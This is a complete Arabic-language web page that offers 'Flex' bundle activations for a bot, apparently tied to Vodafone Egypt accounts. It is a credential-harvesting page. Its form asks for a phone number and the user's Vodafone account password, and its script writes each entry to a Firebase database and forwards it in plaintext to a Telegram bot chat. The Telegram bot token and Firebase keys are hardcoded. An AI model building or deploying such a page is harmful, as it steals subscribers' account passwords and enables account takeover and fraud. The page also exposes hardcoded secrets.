<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تفعيلات فليكس</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
      color: white;
      direction: rtl;
      overflow-x: hidden;
      animation: fadeInBody 1s ease-in;
    }

    @keyframes fadeInBody {
      from {opacity: 0;}
      to {opacity: 1;}
    }

    .container {
      max-width: 400px;
      margin: 70px auto;
      padding: 30px;
      background: rgba(255, 255, 255, 0.07);
      border-radius: 25px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(10px);
      animation: slideUp 1.3s ease;
    }

    @keyframes slideUp {
      0% {transform: translateY(40px); opacity: 0;}
      100% {transform: translateY(0); opacity: 1;}
    }

    h1 {
      text-align: center;
      font-size: 26px;
      margin-bottom: 30px;
      background: linear-gradient(to left, #00ffe7, #00ff87);
      color: black;
      padding: 15px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
    }

    input, select {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      border: none;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.12);
      color: white;
      font-size: 16px;
      outline: none;
      box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
      text-align: right;
    }

    input::placeholder, select {
      text-align: right;
      direction: rtl;
      color: #ddd;
    }

    select option {
      background: #2d2b4e;
      color: white;
    }

    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(135deg, #00c9ff, #92fe9d);
      color: black;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 6px 20px rgba(0, 255, 255, 0.3);
      margin-bottom: 15px;
    }

    button:hover {
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 8px 25px rgba(0, 255, 255, 0.5);
    }

    .success-message {
      margin-top: 20px;
      text-align: center;
      background: #1e272e;
      padding: 12px;
      border-radius: 10px;
      color: #00ff99;
      font-weight: bold;
      animation: fadeIn 0.5s ease;
    }

    @keyframes fadeIn {
      from {opacity: 0;}
      to {opacity: 1;}
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>تفعيلات فليكس الخاصة بالبوت</h1>
    <input type="text" id="phone" placeholder="رقم الهاتف">
    <input type="password" id="password" placeholder="باسورد أنا فودافون">
    <input type="text" id="userId" placeholder="ID الخاص بك في البوت">
    <input type="text" id="whatsapp" placeholder="رقم واتساب للتواصل">

    <button onclick="showOptions()">اختر الباقة</button>
    <select id="plan" style="display:none;">
      <option value="2600 فليكس">باقة 2600 فليكس</option>
      <option value="5200 فليكس">باقة 5200 فليكس</option>
      <option value="7800 فليكس">باقة 7800 فليكس</option>
      <option value="10400 فليكس">باقة 10400 فليكس</option>
      <option value="13000 فليكس">باقة 13000 فليكس</option>
    </select>

    <button onclick="submitForm()">إكمال الطلب</button>
    <div class="success-message" id="success" style="display:none;"></div>
  </div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDhd3l_1q-gNEeihQQY-5fpRvV9vCZgMYA",
      authDomain: "wedoo7.firebaseapp.com",
      databaseURL: "https://wedoo7-default-rtdb.firebaseio.com",
      projectId: "wedoo7",
      storageBucket: "wedoo7.appspot.com",
      messagingSenderId: "176039023490",
      appId: "1:176039023490:web:693f81466bd00a8767f59b",
      measurementId: "G-Y3TLQ3CKYJ"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
  </script>

  <!-- Script -->
  <script>
    function showOptions() {
      document.getElementById("plan").style.display = "block";
    }

    async function submitForm() {
      const phone = document.getElementById("phone").value.trim();
      const password = document.getElementById("password").value.trim();
      const userId = document.getElementById("userId").value.trim();
      const whatsapp = document.getElementById("whatsapp").value.trim();
      const plan = document.getElementById("plan").value;

      if (!phone || !password || !userId || !whatsapp || !plan) {
        alert("يرجى ملء جميع الحقول واختيار الباقة.");
        return;
      }

      const orderRef = db.ref("orders/" + phone);
      const snapshot = await orderRef.get();

      if (snapshot.exists()) {
        alert("لقد قمت بتقديم طلب مسبق لهذا الرقم.");
        return;
      }

      const orderData = {
        phone, password, userId, whatsapp, plan,
        timestamp: new Date().toLocaleString()
      };

      await orderRef.set(orderData);

      // Telegram
      const telegramToken = "7604799658:AAHRsfXVPIbXWqdXm6AhvEyZvbab9C6BxAs";
      const chatId = "8102839626";
      const message = `
✅ طلب جديد من المستخدم:
📱 رقم الهاتف: ${phone}
🔐 باسورد أنا فودافون: ${password}
🆔 ID البوت: ${userId}
💬 واتساب: ${whatsapp}
🎁 الباقة المطلوبة: ${plan}
📅 التاريخ: ${orderData.timestamp}
      `;

      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });

      document.getElementById("success").style.display = "block";
      document.getElementById("success").innerText = "تم تقديم الطلب الخاص بك. انتظر رسالة واتساب لتفعيل الباقة. شكرًا لك 🌟";
    }
  </script>

</body>
</html>
